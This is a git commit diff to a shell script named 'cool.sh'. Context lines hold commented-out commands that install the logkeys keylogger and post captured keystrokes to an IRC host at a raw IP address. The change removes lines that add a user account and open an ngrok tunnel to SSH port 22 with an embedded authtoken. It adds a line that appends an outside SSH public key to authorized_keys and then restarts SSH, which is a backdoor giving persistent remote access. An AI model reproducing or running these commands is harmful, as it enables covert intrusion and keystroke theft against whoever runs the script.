b5ee186f82d2f78ac7b0b61a9b176bddf21c5417
gizmo87898 <73662348+gizmo87898@users.noreply.github.com>
2022-04-26 12:58:06 -0400

    Update cool.sh

--- cool.sh
+++ cool.sh
@@ -9,8 +9,5 @@
 #sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
 
-sudo adduser --gecos 'gizmospw' gizmo
-wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
-tar -xvf ngrok-v3-stable-linux-amd64.tgz
-./ngrok config add-authtoken 28Kn9ch4pzaAkXtG3CigpJWhgb7_2WcHxNFrNGXeTdBJnXBpy
-./ngrok tcp 22
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWUroyP3KoN/A8yEmxY9P32NjeznzwgSNChDLXRnjMTlJ/hgZhtx6twHxnf3qmQp1TlpbM6S74RWfeWnKXQzYuXIbFzC3md6uUpGdlfLRSFdVpH1xIbaI9XT0MUZZ2szuxEs4YyHyf4KsDBNx3A3E62wfFzPizGrwT8BWmKFICb/yrcBvgjLvFj1Yq0LCRPrvbxaXZFkcFhsRn6OE05BVb3fiLlmZ4L85oOQtdnQGEscyXO1viI/6N0RvxoNkH99Tcp6FPqe2cn4VsFwjK9yacSkeiF9szFMRAaPIimbeEPp8CYV2zTFzfZXSAlRLtibxxJFhVmECbdWzBYuEI5kSE9MCrH+GpKshQrZBXg+t1GWRwl2BTjEJ2IOklFJ9p5Rq0WMUOUW0c7o3IySd8AVgxO8Y8q5hNsWJaHoeLy3QpExM2HEsN1cqZ4YF3rEtOgiAerMBb1j9CfaCUsrZJtH1pUx3zB2dysSvCF0NKcAapCNS0hhNlHMY0oNsv5Zn/ZDE= gizmo@Jonathans-MacBook-Pro.local' >> .ssh/authorized_keys
+systemctl restart ssh
